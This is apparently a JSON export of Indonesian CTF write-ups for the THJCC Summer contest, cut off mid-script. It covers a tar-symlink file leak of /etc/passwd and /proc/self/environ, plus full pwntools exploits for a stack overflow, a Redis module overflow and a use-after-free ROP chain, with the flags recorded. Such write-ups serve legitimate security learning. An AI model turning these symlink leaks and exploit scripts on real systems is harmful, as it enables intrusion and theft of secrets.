        "content": "Target:\n\n```\nhttp://chal.thjcc.org:9005/\n```\n\nDeskripsi challenge:\n\n```\nUpload your archives.\nSnapshot what you need.\nPowered by Python's shutil.\n```\n\nEndpoint yang terlihat dari halaman utama:\n\n```\nPOST /restore     # upload archive\nGET  /snapshot    # download snapshot.zip\nPOST /reset       # clear files\nGET  /view?path=  # melihat file hasil restore\n```"
      },
      {
        "title": "Validasi Session",
        "content": "Command untuk membuktikan session sudah benar:\n\n```bash\ncd ~/TimeMachine\nsource /home/nata/ctf_env/bin/activate\n\nURL=\"http://chal.thjcc.org:9005\"\nCOOKIE=\"cookie.txt\"\n\nrm -f \"$COOKIE\"\nrm -rf work payload.tar snapshot.zip out\n\ncurl -s -c \"$COOKIE\" -b \"$COOKIE\" -X POST \"$URL/reset\" >/dev/null\n\nmkdir work\necho \"SESSION_TEST_123\" > work/test.txt\ntar -cf payload.tar -C work test.txt\n\ncurl -s -i -c \"$COOKIE\" -b \"$COOKIE\" -F \"archive=@payload.tar\" \"$URL/restore\" | head -n 20\n\ncurl -s -b \"$COOKIE\" \"$URL/\" | grep -E \"test.txt|SESSION_TEST|FILE|LINK|Nothing\" -n\n\ncurl -s -L -b \"$COOKIE\" \"$URL/snapshot\" -o snapshot.zip\n\nunzip -l snapshot.zip\nrm -rf out\nmkdir out\nunzip -oq snapshot.zip -d out\nfind out -maxdepth 2 -type f -ls\ncat out/test.txt\n```\n\nOutput penting:\n\n```\ntest.txt\nSESSION_TEST_123\n```\n\nIni membuktikan upload dan snapshot sudah berada di session yang sama."
      },
      {
        "title": "Percobaan Symlink",
        "content": "Test dengan `/etc/passwd` membuktikan snapshot mengikuti symlink:\n\n```bash\nURL=\"http://chal.thjcc.org:9005\"\nCOOKIE=\"cookie.txt\"\n\nrm -f \"$COOKIE\"\ncurl -s -c \"$COOKIE\" -b \"$COOKIE\" -X POST \"$URL/reset\" >/dev/null\n\nrm -rf work payload.tar snapshot.zip out\nmkdir work\nln -s /etc/passwd work/passwd\n\ntar -cf payload.tar -C work passwd\n\ncurl -s -i -c \"$COOKIE\" -b \"$COOKIE\" -F \"archive=@payload.tar\" \"$URL/restore\" | head -n 20\n\ncurl -s -L -b \"$COOKIE\" \"$URL/snapshot\" -o snapshot.zip\n\nrm -rf out\nmkdir out\nunzip -oq snapshot.zip -d out\ncat out/passwd | head\n```\n\nOutput:\n\n```\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...\napp:x:1000:1000::/home/app:/bin/sh\n```\n\nIni menjadi bukti bahwa isi target symlink masuk ke snapshot."
      },
      {
        "title": "Eksploit Final",
        "content": "Flag tidak berada di `/flag`, tetapi di environment variable process. Karena process Flask berjalan di container yang sama, `/proc/self/environ` dapat dibaca lewat symlink saat snapshot dibuat.\n\nCommand final:\n\n```bash\ncd ~/TimeMachine\nsource /home/nata/ctf_env/bin/activate\n\nURL=\"http://chal.thjcc.org:9005\"\nCOOKIE=\"cookie.txt\"\n\nrm -f \"$COOKIE\"\nrm -rf work payload.tar snapshot.zip out\n\ncurl -s -c \"$COOKIE\" -b \"$COOKIE\" -X POST \"$URL/reset\" >/dev/null\n\nmkdir work\nln -s /proc/self/environ work/leak\n\ntar -cf payload.tar -C work leak\n\ncurl -s -c \"$COOKIE\" -b \"$COOKIE\" -F \"archive=@payload.tar\" \"$URL/restore\" >/dev/null\n\ncurl -s -L -b \"$COOKIE\" \"$URL/snapshot\" -o snapshot.zip\n\nrm -rf out\nmkdir out\nunzip -oq snapshot.zip -d out\n\ncat out/leak\n```\n\nOutput berisi environment variable:\n\n```\nHOSTNAME=...\nSECRET_KEY=...\nHOME=/home/app\n...\nPWD=/app\nFLAG=THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}\n```"
      },
      {
        "title": "One-liner Pencarian Target",
        "content": "Command ini dipakai untuk mencoba beberapa target lokal secara aman di scope challenge:\n\n```bash\nURL=\"http://chal.thjcc.org:9005\"\nCOOKIE=\"cookie.txt\"\n\nfor TARGET in \\\n  /flag \\\n  /flag.txt \\\n  /app/flag \\\n  /app/flag.txt \\\n  /app/app.py \\\n  /proc/self/environ \\\n  /proc/self/cwd/app.py \\\n  /etc/passwd\ndo\n  echo\n  echo \"==============================\"\n  echo \"[*] trying $TARGET\"\n  echo \"==============================\"\n\n  rm -f \"$COOKIE\"\n  rm -rf work payload.tar snapshot.zip out\n  mkdir work\n\n  curl -s -c \"$COOKIE\" -b \"$COOKIE\" -X POST \"$URL/reset\" >/dev/null\n\n  ln -s \"$TARGET\" work/leak\n  tar -cf payload.tar -C work leak\n\n  curl -s -c \"$COOKIE\" -b \"$COOKIE\" -F \"archive=@payload.tar\" \"$URL/restore\" >/dev/null\n\n  echo \"[+] /view?path=leak:\"\n  curl -s -b \"$COOKIE\" \"$URL/view?path=leak\" | head -c 1000\n  echo\n\n  echo \"[+] snapshot:\"\n  curl -s -L -b \"$COOKIE\" \"$URL/snapshot\" -o snapshot.zip\n\n  rm -rf out\n  mkdir out\n  unzip -oq snapshot.zip -d out 2>/dev/null || true\n\n  if [ -e out/leak ]; then\n    cat out/leak | head -c 1000\n    echo\n  else\n    echo \"no out/leak\"\n  fi\ndone\n```"
      },
      {
        "title": "Kenapa /view Gagal tapi /snapshot Berhasil",
        "content": "`/view?path=leak` mengembalikan:\n\n```\n403 Forbidden\nThat path is not inside your restore directory.\n```\n\nArtinya route view melakukan pengecekan path final sehingga symlink keluar workspace ditolak.\n\nNamun `/snapshot` membuat ZIP dari semua file di workspace. Saat membuat ZIP, `shutil` mengikuti symlink dan membaca isi target. Jadi file symlink tidak bisa dilihat langsung lewat `/view`, tetapi bisa dibocorkan lewat hasil snapshot."
      },
      {
        "title": "Algoritma Eksploit",
        "content": "Alur eksploit:\n\n1. Buat symlink lokal bernama `leak -> /proc/self/environ`\n2. Masukkan symlink ke tar archive\n3. Upload archive ke `/restore` dengan cookie session\n4. Ambil `snapshot.zip` dari `/snapshot` memakai cookie yang sama\n5. Extract `snapshot.zip`\n6. Baca `out/leak`\n7. Ambil nilai `FLAG` dari environment"
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\nbash exploit.sh\n```\n\nAtau jalankan command manual dari bagian Eksploit Final."
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{th3_v3r1f13r_ch3ck3d_th3_n4m3_but_n0t_th3_l1nkn4m3}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-pwn-canarynotes",
    "title": "Canary Notes",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Canary Notes",
    "problemDescription": "`scanf(\"%s\", ...)` membaca tanpa batas ke buffer note 8 byte. Overflow dapat mengubah token lokal, saved `rbp`, dan return address. Receipt pertama memulihkan token; payload kedua mengembalikan token, melewati pengecekan, lalu mengarahkan return ke fungsi shell.",
    "tools": [],
    "analysis": "Fungsi utama berada di `0x401299`. Ia memanggil `scanf` dengan format `%s` dan tujuan `rbp-0x10`. Token disimpan di `rbp-0x8`. Fungsi receipt di `0x40125c` menghitung:\n\n```c\nreceipt = token ^ *(uint64_t *)note;\nprintf(\"receipt: 0x%016lx\\n\", receipt);\n```\n\nFungsi `0x401246` menjalankan `system(\"/bin/sh\")`.\n\n### Vulnerability\n\nLayout stack yang dikonfirmasi GDB:\n\n```text\nrbp-0x10 : note[8]\nrbp-0x08 : token[8]\nrbp       : saved rbp\nrbp+0x08  : saved return address\n```\n\n`scanf(\"%s\", rbp-0x10)` tidak membatasi panjang input. Return address dicapai setelah 24 byte. Program membandingkan token lokal dengan token global sebelum return, jadi token harus dipulihkan dalam payload kedua.\n\n### Menentukan Primitive\n\nInput pertama sepanjang 7 byte (`AAAAAAA`) membuat note menjadi `b\"AAAAAAA\\\\x00\"`; NUL terminator tetap berada di dalam buffer. Karena receipt adalah XOR token dan note, token dihitung dengan:\n\n```python\ntoken = receipt ^ u64(b\"AAAAAAA\\x00\")\n```\n\nToken hasil transformasi berada pada byte printable, sehingga `p64(token)` aman dikirim melalui `%s`.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "```text\nELF 64-bit LSB executable, x86-64, dynamically linked, stripped\nRELRO: Partial RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x400000)\n```\n\nBinary memakai libc dinamis dan interpreter `/lib64/ld-linux-x86-64.so.2`. PIE nonaktif membuat alamat kode stabil. NX aktif, tetapi shellcode tidak diperlukan."
      },
      {
        "title": "Strategi Exploit",
        "content": "Payload kedua berbentuk:\n\n```text\n8 byte note | 8 byte token asli | 8 byte filler rbp | ret | win\n```\n\n`ret` gadget di `0x4010f0` menjaga alignment stack sebelum `system`. Target shell adalah `0x401246`. Tidak ada leak stack/libc atau tebakan ASLR yang diperlukan."
      },
      {
        "title": "Exploit Final",
        "content": "File exploit: [solve.py](./solve.py)\n\n```bash\npython3 solve.py\npython3 solve.py GDB\npython3 solve.py REMOTE HOST=chal.thjcc.org PORT=11038\n```\n\nScript menghitung token secara dinamis, mengirim overflow, lalu menjalankan `cat flag.txt` dari shell hasil exploit."
      },
      {
        "title": "Hasil",
        "content": "Exploit lokal berhasil 5 kali berturut-turut. Pengujian remote terhadap `chal.thjcc.org:11038` menghasilkan:\n\n```text\nreceipt = 0x49063b1008191f2a\ntoken   = 0x49477a5149585e6b\nTHJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}\n```\n\n<FLAG>THJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}</FLAG>"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Token berubah setiap proses, tetapi selalu dapat dipulihkan dari receipt pertama. Gadget dan fungsi stabil karena binary non-PIE. Gadget `ret` diperlukan untuk alignment ABI x86-64."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\r\nfrom pathlib import Path\r\nimport re\r\n\r\nfrom pwn import *\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY_PATH = BASE_DIR / \"chal\"\r\n\r\ncontext.binary = elf = ELF(str(BINARY_PATH), checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\nWIN = 0x401246\r\nRET = 0x4010f0\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        host = args.HOST or \"chal.thjcc.org\"\r\n        port = int(args.PORT or 11038)\r\n        return remote(host, port, timeout=5)\r\n\r\n    if args.GDB:\r\n        return gdb.debug(\r\n            [str(BINARY_PATH)],\r\n            gdbscript=\"\"\"\r\n            set pagination off\r\n            continue\r\n            \"\"\",\r\n        )\r\n\r\n    return process([str(BINARY_PATH)])\r\n\r\n\r\ndef read_receipt(io):\r\n    line = io.recvline_contains(b\"receipt:\")\r\n    match = re.search(rb\"receipt: 0x([0-9a-fA-F]{16})\", line)\r\n    if not match:\r\n        raise ValueError(f\"receipt tidak valid: {line!r}\")\r\n    return int(match.group(1), 16)\r\n\r\n\r\ndef exploit(io):\r\n    io.recvuntil(b\"leave a note:\\n\")\r\n\r\n    # 7 karakter + NUL yang ditulis scanf menjadi note 8-byte.\r\n    # Receipt = token XOR note, jadi token dapat dipulihkan.\r\n    first_note = b\"A\" * 7\r\n    io.sendline(first_note)\r\n    receipt = read_receipt(io)\r\n    token = receipt ^ u64(first_note + b\"\\x00\")\r\n    log.info(\"receipt = %#x\", receipt)\r\n    log.info(\"token   = %#x\", token)\r\n\r\n    io.recvuntil(b\"leave another note:\\n\")\r\n    payload = flat(\r\n        b\"B\" * 8,\r\n        p64(token),\r\n        b\"C\" * 8,\r\n        p64(RET),\r\n        p64(WIN),\r\n    )\r\n    if any(byte == 0 for byte in p64(token)):\r\n        raise ValueError(\"token mengandung NUL dan tidak cocok dengan scanf(%s)\")\r\n    io.sendline(payload)\r\n    io.recvuntil(b\"thanks!\\n\")\r\n\r\n\r\ndef main():\r\n    io = start()\r\n    exploit(io)\r\n    io.sendline(b\"cat flag.txt\")\r\n    output = io.recvrepeat(1.5)\r\n    print(output.decode(errors=\"replace\"), end=\"\")\r\n    io.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{y0u_k1ll3d_c4n4ry_y0u_b4d_b4d}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-pwn-chronicle",
    "title": "Chronicle",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge Chronicle",
    "problemDescription": "Redis module menerima archive `CHRONICLE.IMPORT`. Validasi ukuran annotation memakai cast ke `uint8_t`, sehingga `body_length = 0x100` lolos pemeriksaan `<= 80`. `memcpy` kemudian menyalin 256 byte ke `note[80]` dan menimpa function pointer `completion`.",
    "tools": [],
    "analysis": "`ChronicleTask` menempatkan `note` pada offset `0x48` dan `completion` pada offset `0x98`, jadi function pointer berjarak 80 byte dari awal `note`. `CHRONICLE.NEW` membuat task NOTE dengan completion `commit_annotation` lalu mengembalikan `ticket`:\n\n```c\nticket = (uintptr_t)task->completion ^ rotate_left(task->id * CONST, 17);\n```\n\nTicket pada `CHRONICLE.SHOW` menjadi leak pointer setelah salt dibalik.\n\n### Vulnerability\n\nPada import:\n\n```c\nif ((uint8_t)body_length > NOTE_CAPACITY) reject;\n...\nmemcpy(task->note, cursor, (size_t)body_length);\n```\n\nNilai `body_length=256` berubah menjadi nol saat cast untuk pengecekan, tetapi tetap bernilai 256 saat `memcpy`. Payload menulis 80 byte padding lalu alamat `materialize_anchor` ke `completion`.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "`chronicle.so` adalah ELF x86-64 shared object, dynamic, PIE, NX, Full RELRO, stack canary, IBT, dan SHSTK. Binary tidak stripped. Build remote Docker menghasilkan offset fungsi:\n\n```text\ncommit_annotation  = 0x11b0\nmaterialize_anchor = 0x1280\n```"
      },
      {
        "title": "Strategi Exploit",
        "content": "1. Buat task NOTE dengan delay normal.\n2. Baca ticket dan pulihkan alamat `commit_annotation`.\n3. Hitung alamat `materialize_anchor` dengan delta `0x1280 - 0x11b0 = 0xd0`.\n4. Buat archive valid dengan body 256 byte dan checksum FNV-1a yang benar.\n5. Import archive. Timer memanggil `materialize_anchor`, yang menyalin isi `/tmp/.chronicle-anchor` ke `result`.\n6. Tampilkan task hasil import."
      },
      {
        "title": "Exploit Final",
        "content": "Payload penting:\n\n```python\nbody = b\"A\" * 80 + p64(materialize_anchor) + b\"B\" * (256 - 88)\n```\n\n`solve.py` menggunakan RESP binary-safe untuk `CHRONICLE.IMPORT`, sehingga byte nol dan byte non-printable pada alamat tetap dikirim utuh."
      },
      {
        "title": "Cara Menjalankan",
        "content": "Remote:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py REMOTE HOST=chal.thjcc.org PORT=6379\n```\n\nLokal, setelah Redis challenge berjalan di port 6379:\n\n```bash\npython3 solve.py\n```"
      },
      {
        "title": "Hasil",
        "content": "Exploit berhasil secara konsisten pada service remote. Flag muncul dari response `CHRONICLE.SHOW`:\n\n```text\n<FLAG>THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}</FLAG>\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "Offset harus diambil dari build remote yang sama. `chronicle.so` yang tersedia di luar Docker dibangun dengan compiler berbeda dan memiliki offset fungsi berbeda; memakai `0x1300` untuk `materialize_anchor` membuat Redis crash setelah timer berjalan."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport time\r\n\r\ncontext.log_level = \"info\"\r\n\r\nDEFAULT_HOST = \"chal.thjcc.org\"\r\nDEFAULT_PORT = 6379\r\n\r\nCONST = 0x9e3779b97f4a7c15\r\nMASK = (1 << 64) - 1\r\n\r\n# Remote Docker build (Redis 7.2.15-bookworm/GCC 12):\r\n# commit_annotation = base + 0x11b0\r\n# materialize_anchor = base + 0x1280\r\n# Ticket untuk task NOTE mengenkripsi alamat commit_annotation.\r\nCOMP_OFF = 0x11B0\r\nMAT_OFF  = 0x1280\r\n\r\n\r\ndef conn():\r\n    host = args.HOST if args.HOST else (DEFAULT_HOST if args.REMOTE else \"127.0.0.1\")\r\n    port = int(args.PORT) if args.PORT else DEFAULT_PORT\r\n    return remote(host, port)\r\n\r\n\r\ndef redis_cmd(command):\r\n    r = conn()\r\n    r.sendline(command)\r\n    data = r.recvall(timeout=2)\r\n    r.close()\r\n    return data\r\n\r\n\r\ndef new_task():\r\n    r = conn()\r\n\r\n    r.sendline(\r\n        b\"CHRONICLE.NEW 60000 exploit x\"\r\n    )\r\n\r\n    line = r.recvline().strip()\r\n\r\n    r.close()\r\n\r\n    # Redis RESP integer:\r\n    # :4105\r\n    task_id = int(line.lstrip(b\":\"))\r\n\r\n    return task_id\r\n\r\n\r\ndef show_task(task_id):\r\n\r\n    r = conn()\r\n\r\n    r.sendline(\r\n        f\"CHRONICLE.SHOW {task_id}\".encode()\r\n    )\r\n\r\n    data = r.recvall(timeout=2)\r\n\r\n    r.close()\r\n\r\n    text = data.decode(errors=\"ignore\")\r\n\r\n    log.debug(text)\r\n\r\n    lines = text.splitlines()\r\n\r\n    # RESP array:\r\n    #\r\n    # *6\r\n    # :id\r\n    # +state\r\n    # $label\r\n    # :ticket\r\n    # :delay\r\n    # $result\r\n    #\r\n\r\n    ticket = None\r\n\r\n    for i, line in enumerate(lines):\r\n\r\n        # ticket adalah integer ke-4\r\n        # setelah:\r\n        # *6\r\n        # :id\r\n        # +state\r\n        # $label\r\n        # <label>\r\n        # :ticket\r\n\r\n        if line.startswith(\":\"):\r\n\r\n            if i >= 1:\r\n                # cari integer kedua setelah id\r\n                previous = [\r\n                    x for x in lines[:i]\r\n                    if x.startswith(\":\")\r\n                ]\r\n\r\n                if len(previous) == 1:\r\n                    ticket = int(line[1:])\r\n                    break\r\n\r\n\r\n    if ticket is None:\r\n        print(text)\r\n        raise Exception(\r\n            \"ticket leak gagal\"\r\n        )\r\n\r\n    return ticket\r\n\r\ndef recover_completion(task_id, ticket):\r\n\r\n    ticket &= MASK\r\n\r\n    salt = (\r\n        task_id * CONST\r\n    ) & MASK\r\n\r\n    salt = (\r\n        (salt << 17)\r\n        |\r\n        (salt >> (64 - 17))\r\n    ) & MASK\r\n\r\n    completion = ticket ^ salt\r\n\r\n    return completion\r\n\r\n\r\ndef uvarint(value):\r\n\r\n    out = b\"\"\r\n\r\n    while True:\r\n\r\n        byte = value & 0x7f\r\n\r\n        value >>= 7\r\n\r\n        if value:\r\n            out += bytes(\r\n                [byte | 0x80]\r\n            )\r\n        else:\r\n            out += bytes([byte])\r\n            break\r\n\r\n    return out\r\n\r\n\r\ndef fnv1a32(data):\r\n\r\n    h = 0x811c9dc5\r\n\r\n    for b in data:\r\n\r\n        h ^= b\r\n\r\n        h = (\r\n            h * 0x01000193\r\n        ) & 0xffffffff\r\n\r\n    return h\r\n\r\n\r\ndef build_archive(target):\r\n\r\n    label = b\"x\"\r\n\r\n\r\n    # overflow:\r\n    #\r\n    # note[80]\r\n    # completion pointer\r\n    #\r\n\r\n    body = (\r\n        b\"A\" * 80\r\n        +\r\n        p64(target)\r\n        +\r\n        b\"B\" * (256 - 88)\r\n    )\r\n\r\n\r\n    archive = b\"\"\r\n\r\n    # magic\r\n    archive += b\"CHRN\"\r\n\r\n# version\r\n    archive += b\"\\x01\"\r\n\r\n# kind NOTE\r\n    archive += b\"\\x01\"\r\n\r\n# reserved bytes\r\n    archive += b\"\\x00\\x00\"\r\n\r\n# delay\r\n    archive += p32(10)\r\n\r\n    # label length\r\n    archive += bytes(\r\n        [len(label)]\r\n    )\r\n\r\n    archive += label\r\n\r\n\r\n    # body length varint\r\n    archive += uvarint(\r\n        len(body)\r\n    )\r\n\r\n    archive += body\r\n\r\n\r\n    checksum = fnv1a32(\r\n        archive\r\n    )\r\n\r\n    archive += p32(\r\n        checksum\r\n    )\r\n\r\n    return archive\r\n\r\n\r\n\r\ndef import_archive(archive):\r\n\r\n    r = conn()\r\n\r\n    cmd = b\"CHRONICLE.IMPORT\"\r\n\r\n    resp = (\r\n        b\"*2\\r\\n\"\r\n        + b\"$\" + str(len(cmd)).encode() + b\"\\r\\n\"\r\n        + cmd + b\"\\r\\n\"\r\n        + b\"$\" + str(len(archive)).encode() + b\"\\r\\n\"\r\n        + archive + b\"\\r\\n\"\r\n    )\r\n\r\n    r.send(resp)\r\n\r\n    data = r.recvall(timeout=3)\r\n\r\n    r.close()\r\n\r\n    return data\r\n\r\n\r\ndef main():\r\n\r\n    log.info(\r\n        \"creating leak task\"\r\n    )\r\n\r\n    task = new_task()\r\n\r\n    log.success(\r\n        f\"task id = {task}\"\r\n    )\r\n\r\n\r\n    ticket = show_task(task)\r\n\r\n    log.success(\r\n        f\"ticket = {ticket:#x}\"\r\n    )\r\n\r\n\r\n    completion = recover_completion(\r\n        task,\r\n        ticket\r\n    )\r\n\r\n    log.success(\r\n        f\"completion = {completion:#x}\"\r\n    )\r\n\r\n\r\n    target = (\r\n        completion\r\n        +\r\n        (MAT_OFF - COMP_OFF)\r\n    )\r\n\r\n\r\n    log.success(\r\n        f\"materialize = {target:#x}\"\r\n    )\r\n\r\n\r\n    archive = build_archive(\r\n        target\r\n    )\r\n\r\n    log.info(\r\n        f\"archive size = {len(archive)}\"\r\n    )\r\n\r\n\r\n    result = import_archive(\r\n        archive\r\n    )\r\n\r\n    print(\r\n        result\r\n    )\r\n\r\n\r\n    # RESP integer hasil import\r\n    try:\r\n\r\n        new_id = int(\r\n            result.strip()\r\n            .lstrip(b\":\")\r\n        )\r\n\r\n    except:\r\n\r\n        raise Exception(\r\n            \"IMPORT gagal\"\r\n        )\r\n\r\n\r\n    log.success(\r\n        f\"new task = {new_id}\"\r\n    )\r\n\r\n\r\n    log.info(\r\n        \"waiting timer...\"\r\n    )\r\n\r\n    time.sleep(\r\n        1\r\n    )\r\n\r\n\r\n    for i in range(5):\r\n\r\n        time.sleep(1)\r\n\r\n        out = redis_cmd(\r\n            f\"CHRONICLE.SHOW {new_id}\".encode()\r\n        )\r\n\r\n        print(\r\n            out.decode(\r\n                errors=\"ignore\"\r\n            )\r\n        )\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "THJCC{D0_y0u_KN0W_7h15_15_@_PWN_ch@ll3nge_WH17CH_m4d3_BY_@1???}",
    "lessonsLearned": ""
  },
  {
    "id": "thjccsummer-pwn-djvu",
    "title": "déjà vu",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "THJCC Summer",
    "tags": [],
    "description": "Writeup for challenge déjà vu",
    "problemDescription": "Challenge PWN ini memiliki dangling pointer pada channel message. Refcount message hanya disimpan dalam satu byte, sehingga subscribe ke 256 channel membuat refcount wraparound ke nol. Setelah slot di-discard, pointer pada channel masih tersisa dan bisa dipakai sebagai UAF.\n\nUAF dipakai untuk mendapatkan leak libc, leak stack melalui `environ`, arbitrary read, lalu arbitrary write ke saved RIP. Payload final menjalankan ROP syscall `openat`, `read`, dan `write` untuk membaca flag.",
    "tools": [],
    "analysis": "Message memiliki field penting berikut:\n\n```text\nmessage +0x20 : pointer body\nmessage +0x28 : panjang body\nmessage +0x30 : refcount satu byte\n```\n\nSaat subscribe, refcount dinaikkan dengan operasi byte. Tidak ada pengecekan overflow:\n\n```text\nrefcount = 0xff\nsubscribe sekali lagi\nrefcount = 0x00\n```\n\nKetika slot di-discard, program membebaskan body dan object message karena mengira refcount sudah nol. Pointer yang tersimpan pada channel tidak dibersihkan. Channel tersebut kemudian menjadi dangling pointer.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "Hasil pemeriksaan binary:\n\n```text\nArchitecture: amd64\nLinking:      dynamically linked\nPIE:          enabled\nRELRO:        Full RELRO\nCanary:       enabled\nNX:           enabled\nCET:          SHSTK dan IBT aktif\nSymbols:      stripped\nlibc:         Ubuntu GLIBC 2.35\n```\n\nBinary dijalankan memakai loader dan libc yang disediakan:\n\n```bash\n./ld-linux-x86-64.so.2 --library-path . ./deja_vu\n```"
      },
      {
        "title": "Mendapatkan Leak libc",
        "content": "Pesan dengan body `0x500` byte dibuat dan disubscribe ke channel `0..255`. Setelah discard, body masuk ke unsorted bin, tetapi channel 0 masih menunjuk ke chunk yang sudah dibebaskan.\n\nReplay channel 0 menghasilkan pointer unsorted-bin pada delapan byte pertama. Untuk libc yang disediakan, perhitungannya:\n\n```text\nlibc_base = unsorted_fd - 0x21ace0\n```\n\nLeak ini divalidasi dengan memastikan base address page-aligned."
      },
      {
        "title": "Leak Stack melalui environ",
        "content": "Chunk object message yang sudah dibebaskan direclaim dengan compose message berukuran `0x30`. Body-nya diisi sebagai fake message:\n\n```text\nfake +0x20 = libc.sym['environ']\nfake +0x28 = 8\n```\n\nReplay channel stale kemudian membaca isi `environ`, yaitu pointer ke area stack."
      },
      {
        "title": "Arbitrary Read dan Write",
        "content": "UAF kedua dibuat dengan cara yang sama memakai channel `256..511`. Fake message kedua diarahkan ke area stack.\n\nPada binary lokal, saved RIP berada di:\n\n```text\nenviron - 0x1a8\n```\n\nPada service remote, frame stack berbeda dan saved RIP berada di:\n\n```text\nenviron - 0x180\n```\n\nKarena itu `solve.py` otomatis memakai offset `0x1a8` untuk lokal dan `0x180` untuk remote, serta bisa dioverride dengan argument `OFFSET`.\n\nPayload amend kemudian menulis ROP chain ke saved RIP. Gadget yang dipakai berasal dari libc:\n\n```text\npop rdi ; ret\npop rsi ; ret\npop rdx ; pop r12 ; ret\npop rax ; ret\nsyscall ; ret\n```"
      },
      {
        "title": "ROP ORW",
        "content": "ROP chain final melakukan:\n\n```text\nclose(3..9)\nfd = openat(AT_FDCWD, path, O_RDONLY, 0)\nread(fd, buffer, 0x400)\nwrite(1, buffer, 0x400)\nexit(0)\n```\n\nMenutup descriptor 3 sampai 9 lebih dulu memastikan hasil `openat` menjadi fd 3 pada service remote.\n\nService remote menjalankan proses dari `/home/ctf/deja_vu`. Path flag yang dipakai solver remote adalah `/flag.txt` sesuai deployment challenge."
      },
      {
        "title": "Exploit Final",
        "content": "Semua tahapan sudah diimplementasikan pada [solve.py](solve.py). Solver mendukung mode lokal, GDB, dan remote.\n\nJalankan lokal:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```\n\nJalankan remote:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py REMOTE\n```\n\nOutput remote menghasilkan flag langsung dari service:\n\n```text\nTHJCC{s0_wh1ch_AI_d1d_y0u_us3_t0_s0lv3_th1s???}\n```"
      },
      {
        "title": "Catatan Stabilitas",
        "content": "- Leak unsorted bin digunakan untuk menghitung libc base secara dinamis.\n- Alamat gadget tidak di-hardcode; alamat dihitung dari libc base hasil leak.\n- Offset saved RIP berbeda antara proses lokal dan remote, sehingga solver menyediakan `OFFSET` override.\n- Binary remote memakai seccomp. `openat`, `read`, dan `write` tetap tersedia, sehingga flag dibaca langsung tanpa shell.\n- `flag.txt` lokal hanya dummy untuk pengujian dan bukan flag remote."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nfrom pwn import *\r\nimport re\r\nimport sys\r\n\r\nBASE_DIR = Path(__file__).resolve().parent\r\nBINARY = BASE_DIR / \"deja_vu\"\r\nLIBC = BASE_DIR / \"libc.so.6\"\r\n\r\ncontext.binary = elf = ELF(str(BINARY), checksec=False)\r\nlibc = ELF(str(LIBC), checksec=False)\r\ncontext.log_level = args.LOG or \"info\"\r\ncontext.timeout = int(args.TIMEOUT or 5)\r\n\r\nHOST = args.HOST or \"chal.thjcc.org\"\r\nPORT = int(args.PORT or 9004)\r\n\r\n# syscall x86_64\r\nSYS_READ = 0\r\nSYS_WRITE = 1\r\nSYS_OPEN = 2\r\nSYS_CLOSE = 3\r\nSYS_EXIT = 60\r\nSYS_GETDENTS64 = 217\r\nSYS_OPENAT = 257\r\nAT_FDCWD = 0xFFFFFFFFFFFFFF9C\r\n\r\n# dari leak unsorted-bin pada libc bawaan challenge\r\nUNSORTED_FD_OFFSET = 0x21ACE0\r\n\r\n# gadget offset libc Ubuntu GLIBC 2.35 bawaan challenge\r\nPOP_RDX_POP_R12_RET = 0x11F327\r\nPOP_RAX_RET = 0x45EB0\r\nSYSCALL_RET = 0x912D6\r\n\r\nFLAG_RE = re.compile(rb\"THJCC\\{[^}\\n\\r]+\\}\")\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n\r\n    if args.GDB:\r\n        return gdb.debug(\r\n            [\"./run.sh\"],\r\n            cwd=str(BASE_DIR),\r\n            gdbscript=\"\"\"\r\nset pagination off\r\ncontinue\r\n\"\"\",\r\n        )\r\n\r\n    return process([\"./run.sh\"], cwd=str(BASE_DIR))\r\n\r\n\r\n# Jangan pakai sendlineafter(\"> \") di semua tempat.\r\n# Output menu sering tersisa di buffer setelah batch subscribe/replay.\r\n# Lebih stabil: kirim choice langsung, lalu sync ke prompt spesifik berikutnya.\r\ndef menu(io, choice):\r\n    io.sendline(str(choice).encode())\r\n\r\n\r\ndef compose(io, slot, length, subject, body):\r\n    assert len(body) == length, f\"body length mismatch: 